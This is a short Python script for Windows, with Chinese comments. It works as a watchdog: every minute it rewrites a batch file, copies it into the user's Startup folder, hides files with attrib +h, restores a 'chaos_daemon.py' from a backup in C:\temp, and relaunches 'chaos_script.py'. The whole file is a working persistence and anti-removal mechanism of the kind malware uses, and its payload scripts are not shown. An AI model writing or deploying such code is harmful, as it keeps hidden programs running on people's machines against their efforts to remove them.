import subprocess
import time
import os
import shutil

def restore_files():
    startup = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\StartUp')
    current_dir = os.path.dirname(__file__)
    
    # 檢查並恢復 start_chaos.bat
    bat_path = os.path.join(current_dir, "start_chaos.bat")
    if not os.path.exists(bat_path):
        with open(bat_path, "w") as f:
            daemon_path = os.path.join(current_dir, "chaos_daemon.py")
            f.write(f'@echo off\nstart /B python "{daemon_path}"\n')
        shutil.copy(bat_path, startup)
        os.system(f'cmd /c attrib +h "{bat_path}"')
    
    # 檢查並恢復 chaos_daemon.py 從備份
    daemon_path = os.path.join(current_dir, "chaos_daemon.py")
    if not os.path.exists(daemon_path):
        if os.path.exists(r"C:\temp\chaos_daemon.py"):
            shutil.copy(r"C:\temp\chaos_daemon.py", current_dir)
            os.system(f'cmd /c attrib +h "{daemon_path}"')

while True:
    restore_files()
    try:
        subprocess.Popen(["python", "chaos_script.py"], cwd=os.path.dirname(__file__))
    except Exception as e:
        print(f"Error: {e}")
    time.sleep(60)